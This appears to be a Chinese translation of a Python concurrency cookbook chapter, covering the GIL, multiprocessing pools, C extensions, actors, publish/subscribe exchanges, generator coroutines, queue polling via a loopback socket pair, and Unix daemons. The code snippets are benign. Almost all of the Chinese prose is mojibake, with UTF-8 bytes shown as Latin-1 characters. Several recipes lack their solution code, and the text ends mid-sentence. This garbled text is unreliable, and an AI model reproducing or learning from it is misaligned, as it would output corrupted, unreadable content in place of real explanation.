æœ€å¤§çš„é—®é¢˜å°±æ˜¯ Python çš„å¤šçº¿ç¨‹ç¨‹åºå¹¶ä¸èƒ½åˆ©ç”¨ å¤šæ ¸ CPU çš„ä¼˜åŠ¿ï¼ˆæ¯”å¦‚ä¸€ä¸ªä½¿ç”¨äº†å¤šä¸ªçº¿ç¨‹çš„è®¡ç®—å¯†é›†å‹ç¨‹åºåªä¼šåœ¨ä¸€ä¸ªå• CPU ä¸Š é¢è¿è¡Œï¼‰ã€‚ åœ¨è®¨è®ºæ™®é€šçš„ GIL ä¹‹å‰ï¼Œæœ‰ä¸€ç‚¹è¦å¼ºè°ƒçš„æ˜¯ GIL åªä¼šå½±å“åˆ°é‚£äº›ä¸¥é‡ä¾èµ– CPU çš„ç¨‹åºï¼ˆæ¯”å¦‚è®¡ç®—å‹çš„ï¼‰ã€‚å¦‚æœä½ çš„ç¨‹åºå¤§éƒ¨åˆ†åªä¼šæ¶‰åŠåˆ° I/Oï¼Œæ¯”å¦‚ç½‘ç»œäº¤äº’ï¼Œé‚£ä¹ˆ ä½¿ç”¨å¤šçº¿ç¨‹å°±å¾ˆåˆé€‚ï¼Œå› ä¸ºå®ƒä»¬å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨ç­‰å¾…ã€‚å®é™…ä¸Šï¼Œä½ å®Œå…¨å¯ä»¥æ”¾å¿ƒçš„åˆ›å»º å‡ åƒä¸ª Python çº¿ç¨‹ï¼Œç°ä»£æ“ä½œç³»ç»Ÿè¿è¡Œè¿™ä¹ˆå¤šçº¿ç¨‹æ²¡æœ‰ä»»ä½•å‹åŠ›ï¼Œæ²¡å•¥å¯æ‹…å¿ƒçš„ã€‚ è€Œå¯¹äºä¾èµ– CPU çš„ç¨‹åºï¼Œä½ éœ€è¦å¼„æ¸…æ¥šæ‰§è¡Œçš„è®¡ç®—çš„ç‰¹ç‚¹ã€‚ä¾‹å¦‚ï¼Œä¼˜åŒ–åº•å±‚ç®—æ³• è¦æ¯”ä½¿ç”¨å¤šçº¿ç¨‹è¿è¡Œå¿«å¾—å¤šã€‚ç±»ä¼¼çš„ï¼Œç”±äº Python æ˜¯è§£é‡Šæ‰§è¡Œçš„ï¼Œå¦‚æœä½ å°†é‚£äº›æ€§èƒ½ ç“¶é¢ˆä»£ç ç§»åˆ°ä¸€ä¸ª C è¯­è¨€æ‰©å±•æ¨¡å—ä¸­ï¼Œé€Ÿåº¦ä¹Ÿä¼šæå‡çš„å¾ˆå¿«ã€‚å¦‚æœä½ è¦æ“ä½œæ•°ç»„ï¼Œé‚£ ä¹ˆä½¿ç”¨ NumPy è¿™æ ·çš„æ‰©å±•ä¼šéå¸¸çš„é«˜æ•ˆã€‚æœ€åï¼Œä½ è¿˜å¯ä»¥è€ƒè™‘ä¸‹å…¶ä»–å¯é€‰å®ç°æ–¹æ¡ˆï¼Œ æ¯”å¦‚ PyPyï¼Œå®ƒé€šè¿‡ä¸€ä¸ª JIT ç¼–è¯‘å™¨æ¥ä¼˜åŒ–æ‰§è¡Œæ•ˆç‡ï¼ˆä¸è¿‡åœ¨å†™è¿™æœ¬ä¹¦çš„æ—¶å€™å®ƒè¿˜ä¸èƒ½ æ”¯æŒ Python 3ï¼‰ã€‚ è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼Œçº¿ç¨‹ä¸æ˜¯ä¸“é—¨ç”¨æ¥ä¼˜åŒ–æ€§èƒ½çš„ã€‚ä¸€ä¸ª CPU ä¾èµ–å‹ç¨‹åºå¯èƒ½ ä¼šä½¿ç”¨çº¿ç¨‹æ¥ç®¡ç†ä¸€ä¸ªå›¾å½¢ç”¨æˆ·ç•Œé¢ã€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–å…¶ä»–æœåŠ¡ã€‚è¿™æ—¶å€™ï¼ŒGIL ä¼šäº§ç”Ÿ ä¸€äº›é—®é¢˜ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªçº¿ç¨‹é•¿æœŸæŒæœ‰ GIL çš„è¯ä¼šå¯¼è‡´å…¶ä»–é CPU å‹çº¿ç¨‹ä¸€ç›´ç­‰å¾…ã€‚ äº‹å®ä¸Šï¼Œä¸€ä¸ªå†™çš„ä¸å¥½çš„ C è¯­è¨€æ‰©å±•ä¼šå¯¼è‡´è¿™ä¸ªé—®é¢˜æ›´åŠ ä¸¥é‡ï¼Œå°½ç®¡ä»£ç çš„è®¡ç®—éƒ¨åˆ† ä¼šæ¯”ä¹‹å‰è¿è¡Œçš„æ›´å¿«äº›ã€‚ è¯´äº†è¿™ä¹ˆå¤šï¼Œç°åœ¨æƒ³è¯´çš„æ˜¯æˆ‘ä»¬æœ‰ä¸¤ç§ç­–ç•¥æ¥è§£å†³ GIL çš„ç¼ºç‚¹ã€‚é¦–å…ˆï¼Œå¦‚æœä½ å®Œ å…¨å·¥ä½œäº Python ç¯å¢ƒä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ multiprocessing æ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ± ï¼Œå¹¶ åƒååŒå¤„ç†å™¨ä¸€æ ·çš„ä½¿ç”¨å®ƒã€‚ä½¿ç”¨ä¸€ä¸ªæŠ€å·§åˆ©ç”¨è¿›ç¨‹æ± è§£å†³äº† GIL çš„é—®é¢˜ã€‚å½“ä¸€ä¸ªçº¿ç¨‹æƒ³è¦æ‰§è¡Œ CPU å¯†é›†å‹å·¥ä½œæ—¶ï¼Œä¼šå°†ä»»åŠ¡å‘ç»™è¿›ç¨‹æ± ã€‚ç„¶åè¿›ç¨‹æ± ä¼šåœ¨å¦å¤–ä¸€ä¸ªè¿›ç¨‹ä¸­å¯åŠ¨ä¸€ä¸ªå•ç‹¬çš„ Python è§£é‡Šå™¨æ¥å·¥ä½œã€‚å½“çº¿ç¨‹ç­‰å¾…ç»“æœçš„æ—¶å€™ä¼šé‡Šæ”¾ GILã€‚å¹¶ä¸”ï¼Œç”±äºè®¡ç®—ä»»åŠ¡åœ¨å• ç‹¬è§£é‡Šå™¨ä¸­æ‰§è¡Œï¼Œé‚£ä¹ˆå°±ä¸ä¼šå—é™äº GIL äº†ã€‚åœ¨ä¸€ä¸ªå¤šæ ¸ç³»ç»Ÿä¸Šé¢ï¼Œä½ ä¼šå‘ç°è¿™ä¸ªæŠ€ æœ¯å¯ä»¥è®©ä½ å¾ˆå¥½çš„åˆ©ç”¨å¤š CPU çš„ä¼˜åŠ¿ã€‚ å¦å¤–ä¸€ä¸ªè§£å†³ GIL çš„ç­–ç•¥æ˜¯ä½¿ç”¨ C æ‰©å±•ç¼–ç¨‹æŠ€æœ¯ã€‚ä¸»è¦æ€æƒ³æ˜¯å°†è®¡ç®—å¯†é›†å‹ä»»åŠ¡ è½¬ç§»ç»™ Cï¼Œè·Ÿ Python ç‹¬ç«‹ï¼Œåœ¨å·¥ä½œçš„æ—¶å€™åœ¨ C ä»£ç ä¸­é‡Šæ”¾ GILã€‚è¿™å¯ä»¥é€šè¿‡åœ¨ C ä»£ ç ä¸­æ’å…¥ä¸‹é¢è¿™æ ·çš„ç‰¹æ®Šå®æ¥å®Œæˆ: #include \"Python.h\" ... PyObject *pyfunc(PyObject *self, PyObject *args) { ... Py_BEGIN_ALLOW_THREADS // Threaded C code ... Py_END_ALLOW_THREADS ... } å¦‚æœä½ ä½¿ç”¨å…¶ä»–å·¥å…·è®¿é—® C è¯­è¨€ï¼Œæ¯”å¦‚å¯¹äº Cython çš„ ctypes åº“ï¼Œä½ ä¸éœ€è¦åšä»» ä½•äº‹ã€‚ä¾‹å¦‚ï¼Œctypes åœ¨è°ƒç”¨ C æ—¶ä¼šè‡ªåŠ¨é‡Šæ”¾ GILã€‚ è®¨è®º è®¸å¤šç¨‹åºå‘˜åœ¨é¢å¯¹çº¿ç¨‹æ€§èƒ½é—®é¢˜çš„æ—¶å€™ï¼Œé©¬ä¸Šå°±ä¼šæ€ªç½ª GILï¼Œä»€ä¹ˆéƒ½æ˜¯å®ƒçš„é—®é¢˜ã€‚ å…¶å®è¿™æ ·å­å¤ªä¸åšé“ä¹Ÿå¤ªå¤©çœŸäº†ç‚¹ã€‚ä½œä¸ºä¸€ä¸ªçœŸå®çš„ä¾‹å­ï¼Œåœ¨å¤šçº¿ç¨‹çš„ç½‘ç»œç¼–ç¨‹ä¸­ç¥ç§˜ çš„ stalls å¯èƒ½æ˜¯å› ä¸ºå…¶ä»–åŸå› æ¯”å¦‚ä¸€ä¸ª DNS æŸ¥æ‰¾å»¶æ—¶ï¼Œè€Œè·Ÿ GIL æ¯«æ— å…³ç³»ã€‚æœ€åä½  çœŸçš„éœ€è¦å…ˆå»ææ‡‚ä½ çš„ä»£ç æ˜¯å¦çœŸçš„è¢« GIL å½±å“åˆ°ã€‚åŒæ—¶è¿˜è¦æ˜ç™½ GIL å¤§éƒ¨åˆ†éƒ½åº”è¯¥ åªå…³æ³¨ CPU çš„å¤„ç†è€Œä¸æ˜¯ I/O. å¦‚æœä½ å‡†å¤‡ä½¿ç”¨ä¸€ä¸ªå¤„ç†å™¨æ± ï¼Œæ³¨æ„çš„æ˜¯è¿™æ ·åšæ¶‰åŠåˆ°æ•°æ®åºåˆ—åŒ–å’Œåœ¨ä¸åŒ Python è§£é‡Šå™¨é€šä¿¡ã€‚è¢«æ‰§è¡Œçš„æ“ä½œéœ€è¦æ”¾åœ¨ä¸€ä¸ªé€šè¿‡ def è¯­å¥å®šä¹‰çš„ Python å‡½æ•°ä¸­ï¼Œ ä¸èƒ½æ˜¯ lambdaã€é—­åŒ…å¯è°ƒç”¨å®ä¾‹ç­‰ï¼Œå¹¶ä¸”å‡½æ•°å‚æ•°å’Œè¿”å›å€¼å¿…é¡»è¦å…¼å®¹ pickleã€‚åŒæ ·ï¼Œ è¦æ‰§è¡Œçš„ä»»åŠ¡é‡å¿…é¡»è¶³å¤Ÿå¤§ä»¥å¼¥è¡¥é¢å¤–çš„é€šä¿¡å¼€é”€ã€‚ å¦å¤–ä¸€ä¸ªéš¾ç‚¹æ˜¯å½“æ··åˆä½¿ç”¨çº¿ç¨‹å’Œè¿›ç¨‹æ± çš„æ—¶å€™ä¼šè®©ä½ å¾ˆå¤´ç–¼ã€‚å¦‚æœä½ è¦åŒæ—¶ä½¿ ç”¨ä¸¤è€…ï¼Œæœ€å¥½åœ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œåˆ›å»ºä»»ä½•çº¿ç¨‹ä¹‹å‰å…ˆåˆ›å»ºä¸€ä¸ªå•ä¾‹çš„è¿›ç¨‹æ± ã€‚ç„¶åçº¿ç¨‹ä½¿ ç”¨åŒæ ·çš„è¿›ç¨‹æ± æ¥è¿›è¡Œå®ƒä»¬çš„è®¡ç®—å¯†é›†å‹å·¥ä½œã€‚ C æ‰©å±•æœ€é‡è¦çš„ç‰¹å¾æ˜¯å®ƒä»¬å’Œ Python è§£é‡Šå™¨æ˜¯ä¿æŒç‹¬ç«‹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ å‡† å¤‡å°† Python ä¸­çš„ä»»åŠ¡åˆ†é…åˆ° C ä¸­å»æ‰§è¡Œï¼Œä½ éœ€è¦ç¡®ä¿ C ä»£ç çš„æ“ä½œè·Ÿ Python ä¿æŒ ç‹¬ç«‹ï¼Œè¿™å°±æ„å‘³ç€ä¸è¦ä½¿ç”¨ Python æ•°æ®ç»“æ„ä»¥åŠä¸è¦è°ƒç”¨ Python çš„ C APIã€‚å¦å¤–ä¸€ ä¸ªå°±æ˜¯ä½ è¦ç¡®ä¿ C æ‰©å±•æ‰€åšçš„å·¥ä½œæ˜¯è¶³å¤Ÿçš„ï¼Œå€¼å¾—ä½ è¿™æ ·åšã€‚ä¹Ÿå°±æ˜¯è¯´ C æ‰©å±•æ‹…è´Ÿèµ· äº†å¤§é‡çš„è®¡ç®—ä»»åŠ¡ï¼Œè€Œä¸æ˜¯å°‘æ•°å‡ ä¸ªè®¡ç®—ã€‚ è¿™äº›è§£å†³ GIL çš„æ–¹æ¡ˆå¹¶ä¸èƒ½é€‚ç”¨äºæ‰€æœ‰é—®é¢˜ã€‚ä¾‹å¦‚ï¼ŒæŸäº›ç±»å‹çš„åº”ç”¨ç¨‹åºå¦‚æœè¢« åˆ†è§£ä¸ºå¤šä¸ªè¿›ç¨‹å¤„ç†çš„è¯å¹¶ä¸èƒ½å¾ˆå¥½çš„å·¥ä½œï¼Œä¹Ÿä¸èƒ½å°†å®ƒçš„éƒ¨åˆ†ä»£ç æ”¹æˆ C è¯­è¨€æ‰§è¡Œã€‚ å¯¹äºè¿™äº›åº”ç”¨ç¨‹åºï¼Œä½ å°±è¦è‡ªå·±éœ€æ±‚è§£å†³æ–¹æ¡ˆäº†ï¼ˆæ¯”å¦‚å¤šè¿›ç¨‹è®¿é—®å…±äº«å†…å­˜åŒºï¼Œå¤šè§£æ å™¨è¿è¡ŒäºåŒä¸€ä¸ªè¿›ç¨‹ç­‰ï¼‰ã€‚æˆ–è€…ï¼Œä½ è¿˜å¯ä»¥è€ƒè™‘ä¸‹å…¶ä»–çš„è§£é‡Šå™¨å®ç°ï¼Œæ¯”å¦‚ PyPyã€‚ å®šä¹‰ä¸€ä¸ª Actor ä»»åŠ¡ é—®é¢˜ ä½ æƒ³å®šä¹‰è·Ÿ actor æ¨¡å¼ä¸­ç±»ä¼¼\"actors\"è§’è‰²çš„ä»»åŠ¡ è§£å†³æ–¹æ¡ˆ actor æ¨¡å¼æ˜¯ä¸€ç§æœ€å¤è€çš„ä¹Ÿæ˜¯æœ€ç®€å•çš„å¹¶è¡Œå’Œåˆ†å¸ƒå¼è®¡ç®—è§£å†³æ–¹æ¡ˆã€‚äº‹å®ä¸Šï¼Œå®ƒ å¤©ç”Ÿçš„ç®€å•æ€§æ˜¯å®ƒå¦‚æ­¤å—æ¬¢è¿çš„é‡è¦åŸå› ä¹‹ä¸€ã€‚ç®€å•æ¥è®²ï¼Œä¸€ä¸ª actor å°±æ˜¯ä¸€ä¸ªå¹¶å‘æ‰§ è¡Œçš„ä»»åŠ¡ï¼Œåªæ˜¯ç®€å•çš„æ‰§è¡Œå‘é€ç»™å®ƒçš„æ¶ˆæ¯ä»»åŠ¡ã€‚å“åº”è¿™äº›æ¶ˆæ¯æ—¶ï¼Œå®ƒå¯èƒ½è¿˜ä¼šç»™å…¶ä»– actor å‘é€æ›´è¿›ä¸€æ­¥çš„æ¶ˆæ¯ã€‚actor ä¹‹é—´çš„é€šä¿¡æ˜¯å•å‘å’Œå¼‚æ­¥çš„ã€‚å› æ­¤ï¼Œæ¶ˆæ¯å‘é€è€…ä¸çŸ¥ é“æ¶ˆæ¯æ˜¯ä»€ä¹ˆæ—¶å€™è¢«å‘é€ï¼Œä¹Ÿä¸ä¼šæ¥æ”¶åˆ°ä¸€ä¸ªæ¶ˆæ¯å·²è¢«å¤„ç†çš„å›åº”æˆ–é€šçŸ¥ã€‚ è®¨è®º actor æ¨¡å¼çš„é­…åŠ›å°±åœ¨äºå®ƒçš„ç®€å•æ€§ã€‚ å®ç°æ¶ˆæ¯å‘å¸ƒ/è®¢é˜…æ¨¡å‹ é—®é¢˜ ä½ æœ‰ä¸€ä¸ªåŸºäºçº¿ç¨‹é€šä¿¡çš„ç¨‹åºï¼Œæƒ³è®©å®ƒä»¬å®ç°å‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„æ¶ˆæ¯é€šä¿¡ è§£å†³æ–¹æ¡ˆ è¦å®ç°å‘å¸ƒ/è®¢é˜…çš„æ¶ˆæ¯é€šä¿¡æ¨¡å¼ï¼Œä½ é€šå¸¸è¦å¼•å…¥ä¸€ä¸ªå•ç‹¬çš„\"äº¤æ¢æœº\"æˆ–\"ç½‘å…³\" å¯¹è±¡ä½œä¸ºæ‰€æœ‰æ¶ˆæ¯çš„ä¸­ä»‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç›´æ¥å°†æ¶ˆæ¯ä»ä¸€ä¸ªä»»åŠ¡å‘é€åˆ°å¦ä¸€ä¸ªï¼Œè€Œæ˜¯å°† å…¶å‘é€ç»™äº¤æ¢æœºï¼Œç„¶åç”±äº¤æ¢æœºå°†å®ƒå‘é€ç»™ä¸€ä¸ªæˆ–å¤šä¸ªè¢«å…³è”ä»»åŠ¡ã€‚ è®¨è®º é€šè¿‡é˜Ÿåˆ—å‘é€æ¶ˆæ¯çš„ä»»åŠ¡æˆ–çº¿ç¨‹çš„æ¨¡å¼å¾ˆå®¹æ˜“è¢«å®ç°å¹¶ä¸”ä¹Ÿéå¸¸æ™®éã€‚ä¸è¿‡ï¼Œä½¿ç”¨ å‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„å¥½å¤„æ›´åŠ æ˜æ˜¾ã€‚ é¦–å…ˆï¼Œä½¿ç”¨ä¸€ä¸ªäº¤æ¢æœºå¯ä»¥ç®€åŒ–å¤§éƒ¨åˆ†æ¶‰åŠåˆ°çº¿ç¨‹é€šä¿¡çš„å·¥ä½œã€‚æ— éœ€å»å†™é€šè¿‡å¤šè¿› ç¨‹æ¨¡å—æ¥æ“ä½œå¤šä¸ªçº¿ç¨‹ï¼Œä½ åªéœ€è¦ä½¿ç”¨è¿™ä¸ªäº¤æ¢æœºæ¥è¿æ¥å®ƒä»¬ã€‚æŸç§ç¨‹åº¦ä¸Šï¼Œè¿™ä¸ªå°±è·Ÿ æ—¥å¿—æ¨¡å—çš„å·¥ä½œåŸç†ç±»ä¼¼ã€‚å®é™…ä¸Šï¼Œå®ƒå¯ä»¥è½»æ¾çš„è§£è€¦ç¨‹åºä¸­å¤šä¸ªä»»åŠ¡ã€‚ å…¶æ¬¡ï¼Œäº¤æ¢æœºå¹¿æ’­æ¶ˆæ¯ç»™å¤šä¸ªè®¢é˜…è€…çš„èƒ½åŠ›å¸¦æ¥äº†ä¸€ä¸ªå…¨æ–°çš„é€šä¿¡æ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œä½  å¯ä»¥ä½¿ç”¨å¤šä»»åŠ¡ç³»ç»Ÿã€å¹¿æ’­æˆ–æ‰‡å‡ºã€‚ä½ è¿˜å¯ä»¥é€šè¿‡ä»¥æ™®é€šè®¢é˜…è€…èº«ä»½ç»‘å®šæ¥æ„å»ºè°ƒè¯•å’Œ è¯Šæ–­å·¥å…·ã€‚ å…³äºäº¤æ¢æœºçš„ä¸€ä¸ªå¯èƒ½é—®é¢˜æ˜¯å¯¹äºè®¢é˜…è€…çš„æ­£ç¡®ç»‘å®šå’Œè§£ç»‘ã€‚ä¸ºäº†æ­£ç¡®çš„ç®¡ç†èµ„ æºï¼Œæ¯ä¸€ä¸ªç»‘å®šçš„è®¢é˜…è€…å¿…é¡»æœ€ç»ˆè¦è§£ç»‘ã€‚ å¦‚: exc = get_exchange('name') exc.attach(some_task) try: ... finally: exc.detach(some_task) æŸç§æ„ä¹‰ä¸Šï¼Œè¿™ä¸ªå’Œä½¿ç”¨æ–‡ä»¶ã€é”å’Œç±»ä¼¼å¯¹è±¡å¾ˆåƒã€‚é€šå¸¸å¾ˆå®¹æ˜“ä¼šå¿˜è®°æœ€åçš„ detach() æ­¥éª¤ã€‚ä¸ºäº†ç®€åŒ–è¿™ä¸ªï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨åè®®ã€‚ æœ€åè¿˜åº”è¯¥æ³¨æ„çš„æ˜¯å…³äºäº¤æ¢æœºçš„æ€æƒ³æœ‰å¾ˆå¤šç§çš„æ‰©å±•å®ç°ã€‚ä¾‹å¦‚ï¼Œäº¤æ¢æœºå¯ä»¥å® ç°ä¸€æ•´ä¸ªæ¶ˆæ¯é€šé“é›†åˆæˆ–æä¾›äº¤æ¢æœºåç§°çš„æ¨¡å¼åŒ¹é…è§„åˆ™ã€‚äº¤æ¢æœºè¿˜å¯ä»¥è¢«æ‰©å±•åˆ°åˆ† å¸ƒå¼è®¡ç®—ç¨‹åºä¸­ï¼ˆæ¯”å¦‚ï¼Œå°†æ¶ˆæ¯è·¯ç”±åˆ°ä¸åŒæœºå™¨ä¸Šé¢çš„ä»»åŠ¡ä¸­å»ï¼‰ã€‚ ä½¿ç”¨ç”Ÿæˆå™¨ä»£æ›¿çº¿ç¨‹ é—®é¢˜ ä½ æƒ³ä½¿ç”¨ç”Ÿæˆå™¨ï¼ˆåç¨‹ï¼‰æ›¿ä»£ç³»ç»Ÿçº¿ç¨‹æ¥å®ç°å¹¶å‘ã€‚è¿™ä¸ªæœ‰æ—¶åˆè¢«ç§°ä¸ºç”¨æˆ·çº§çº¿ç¨‹ æˆ–ç»¿è‰²çº¿ç¨‹ã€‚ è§£å†³æ–¹æ¡ˆ è¦ä½¿ç”¨ç”Ÿæˆå™¨å®ç°è‡ªå·±çš„å¹¶å‘ï¼Œä½ é¦–å…ˆè¦å¯¹ç”Ÿæˆå™¨å‡½æ•°å’Œ yield è¯­å¥æœ‰æ·±åˆ»ç†è§£ã€‚ yield è¯­å¥ä¼šè®©ä¸€ä¸ªç”Ÿæˆå™¨æŒ‚èµ·å®ƒçš„æ‰§è¡Œï¼Œè¿™æ ·å°±å¯ä»¥ç¼–å†™ä¸€ä¸ªè°ƒåº¦å™¨ï¼Œå°†ç”Ÿæˆå™¨å½“åš æŸç§\"ä»»åŠ¡\"å¹¶ä½¿ç”¨ä»»åŠ¡åä½œåˆ‡æ¢æ¥æ›¿æ¢å®ƒä»¬çš„æ‰§è¡Œã€‚ è®¨è®º åœ¨æ„å»ºåŸºäºç”Ÿæˆå™¨çš„å¹¶å‘æ¡†æ¶æ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨æ›´å¸¸è§çš„ yield å½¢å¼: def some_generator(): ... result = yield data ... ä½¿ç”¨è¿™ç§å½¢å¼çš„ yield è¯­å¥çš„å‡½æ•°é€šå¸¸è¢«ç§°ä¸º\"åç¨‹\"ã€‚é€šè¿‡è°ƒåº¦å™¨ï¼Œyield è¯­å¥åœ¨ ä¸€ä¸ªå¾ªç¯ä¸­è¢«å¤„ç†ï¼Œå¦‚ä¸‹: f = some_generator() # Initial result. Is None to start since nothing has been computed result = None while True: try: data = f.send(result) result = ... do some calculation ... except StopIteration: break yield from è¯­å¥è¢«ç”¨æ¥å®ç°åç¨‹ï¼Œå¯ä»¥è¢«å…¶å®ƒç”Ÿæˆå™¨ä½œä¸º å­ç¨‹åºæˆ–è¿‡ç¨‹æ¥è°ƒç”¨ã€‚æœ¬è´¨ä¸Šå°±æ˜¯å°†æ§åˆ¶æƒé€æ˜çš„ä¼ è¾“ç»™æ–°çš„å‡½æ•°ã€‚ä¸åƒæ™®é€šçš„ç”Ÿæˆ å™¨ï¼Œä¸€ä¸ªä½¿ç”¨ yield from è¢«è°ƒç”¨çš„å‡½æ•°å¯ä»¥è¿”å›ä¸€ä¸ªä½œä¸º yield from è¯­å¥ç»“æœçš„å€¼ã€‚ å¦‚æœä½¿ç”¨ç”Ÿæˆå™¨ç¼–ç¨‹ï¼Œè¦æé†’ä½ çš„æ˜¯å®ƒè¿˜æ˜¯æœ‰å¾ˆå¤šç¼ºç‚¹çš„ã€‚ç‰¹åˆ«æ˜¯ï¼Œä½ å¾—ä¸ åˆ°ä»»ä½•çº¿ç¨‹å¯ä»¥æä¾›çš„å¥½å¤„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æ‰§è¡Œ CPU ä¾èµ–æˆ– I/O é˜»å¡ç¨‹åºï¼Œå®ƒä¼šå°†æ•´ ä¸ªä»»åŠ¡æŒ‚èµ·çŸ¥é“æ“ä½œå®Œæˆã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½ åªèƒ½é€‰æ‹©å°†æ“ä½œå§”æ´¾ç»™å¦å¤–ä¸€ä¸ªå¯ä»¥ ç‹¬ç«‹è¿è¡Œçš„çº¿ç¨‹æˆ–è¿›ç¨‹ã€‚å¦å¤–ä¸€ä¸ªé™åˆ¶æ˜¯å¤§éƒ¨åˆ† Python åº“å¹¶ä¸èƒ½å¾ˆå¥½çš„å…¼å®¹åŸºäºç”Ÿæˆ å™¨çš„çº¿ç¨‹ã€‚å¦‚æœä½ é€‰æ‹©è¿™ä¸ªæ–¹æ¡ˆï¼Œä½ ä¼šå‘ç°ä½ éœ€è¦è‡ªå·±æ”¹å†™å¾ˆå¤šæ ‡å‡†åº“å‡½æ•°ã€‚ å¤šä¸ªçº¿ç¨‹é˜Ÿåˆ—è½®è¯¢ é—®é¢˜ ä½ æœ‰ä¸€ä¸ªçº¿ç¨‹é˜Ÿåˆ—é›†åˆï¼Œæƒ³ä¸ºåˆ°æ¥çš„å…ƒç´ è½®è¯¢å®ƒä»¬ï¼Œå°±è·Ÿä½ ä¸ºä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚å»è½® è¯¢ä¸€ä¸ªç½‘ç»œè¿æ¥é›†åˆçš„æ–¹å¼ä¸€æ ·ã€‚ è§£å†³æ–¹æ¡ˆ å¯¹äºè½®è¯¢é—®é¢˜çš„ä¸€ä¸ªå¸¸è§è§£å†³æ–¹æ¡ˆä¸­æœ‰ä¸ªå¾ˆå°‘æœ‰äººçŸ¥é“çš„æŠ€å·§ï¼ŒåŒ…å«äº†ä¸€ä¸ªéšè— çš„å›è·¯ç½‘ç»œè¿æ¥ã€‚æœ¬è´¨ä¸Šè®²å…¶æ€æƒ³å°±æ˜¯ï¼šå¯¹äºæ¯ä¸ªä½ æƒ³è¦è½®è¯¢çš„é˜Ÿåˆ—ï¼Œä½ åˆ›å»ºä¸€å¯¹è¿æ¥ çš„å¥—æ¥å­—ã€‚ç„¶åä½ åœ¨å…¶ä¸­ä¸€ä¸ªå¥—æ¥å­—ä¸Šé¢ç¼–å†™ä»£ç æ¥æ ‡è¯†å­˜åœ¨çš„æ•°æ®ï¼Œå¦å¤–ä¸€ä¸ªå¥—æ¥å­— è¢«ä¼ ç»™ select() æˆ–ç±»ä¼¼çš„ä¸€ä¸ªè½®è¯¢æ•°æ®åˆ°è¾¾çš„å‡½æ•°: # Compatibility on non-POSIX systems server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind(('127.0.0.1', 0)) server.listen(1) self._putsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self._putsocket.connect(server.getsockname()) self._getsocket, _ = server.accept() server.close() è®¨è®º å¯¹äºè½®è¯¢éç±»æ–‡ä»¶å¯¹è±¡ï¼Œæ¯”å¦‚é˜Ÿåˆ—é€šå¸¸éƒ½æ˜¯æ¯”è¾ƒæ£˜æ‰‹çš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ ä¸ä½¿ç”¨ ä¸Šé¢çš„å¥—æ¥å­—æŠ€æœ¯ï¼Œä½ å”¯ä¸€çš„é€‰æ‹©å°±æ˜¯ç¼–å†™ä»£ç æ¥å¾ªç¯éå†è¿™äº›é˜Ÿåˆ—å¹¶ä½¿ç”¨ä¸€ä¸ªå®šæ—¶ å™¨ã€‚ è¿™æ ·åšå…¶å®ä¸åˆç†ï¼Œè¿˜ä¼šå¼•å…¥å…¶ä»–çš„æ€§èƒ½é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ–°çš„æ•°æ®è¢«åŠ å…¥åˆ°ä¸€ä¸ª é˜Ÿåˆ—ä¸­ï¼Œè‡³å°‘è¦èŠ± sleepçš„æ—¶é—´ æ‰èƒ½è¢«å‘ç°ã€‚å¦‚æœä½ ä¹‹å‰çš„è½®è¯¢è¿˜è¦å»è½®è¯¢å…¶ä»–å¯¹è±¡ï¼Œæ¯”å¦‚ ç½‘ç»œå¥—æ¥å­—é‚£è¿˜ä¼šæœ‰æ›´å¤šé—®é¢˜ã€‚ åœ¨ Unix ç³»ç»Ÿä¸Šé¢å¯åŠ¨å®ˆæŠ¤è¿›ç¨‹ é—®é¢˜ ä½ æƒ³ç¼–å†™ä¸€ä¸ªä½œä¸ºä¸€ä¸ªåœ¨ Unix æˆ–ç±» Unix ç³»ç»Ÿä¸Šé¢è¿è¡Œçš„å®ˆæŠ¤è¿›ç¨‹è¿è¡Œçš„ç¨‹åº è§£å†³æ–¹æ¡ˆ åˆ›å»ºä¸€ä¸ªæ­£ç¡®çš„å®ˆæŠ¤è¿›ç¨‹éœ€è¦ä¸€ä¸ªç²¾ç¡®çš„ç³»ç»Ÿè°ƒç”¨åºåˆ—ä»¥åŠå¯¹äºç»†èŠ‚çš„æ§åˆ¶ã€‚ åˆ›å»ºä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹çš„æ­¥éª¤çœ‹ä¸Šå»ä¸æ˜¯å¾ˆæ˜“æ‡‚ï¼Œä½†æ˜¯å¤§ä½“æ€æƒ³æ˜¯è¿™æ ·çš„ï¼Œé¦–å…ˆï¼Œä¸€ä¸ª å®ˆæŠ¤è¿›ç¨‹å¿…é¡»è¦ä»çˆ¶è¿›ç¨‹ä¸­è„±ç¦»ã€‚è¿™æ˜¯ç”± os.fork() æ“ä½œæ¥å®Œæˆçš„ï¼Œå¹¶ç«‹å³è¢«çˆ¶è¿›ç¨‹ ç»ˆæ­¢ã€‚ åœ¨å­è¿›ç¨‹å˜æˆå­¤å„¿åï¼Œè°ƒç”¨ os.setsid() åˆ›å»ºäº†ä¸€ä¸ªå…¨æ–°çš„è¿›ç¨‹ä¼šè¯ï¼Œå¹¶è®¾ç½®å­ 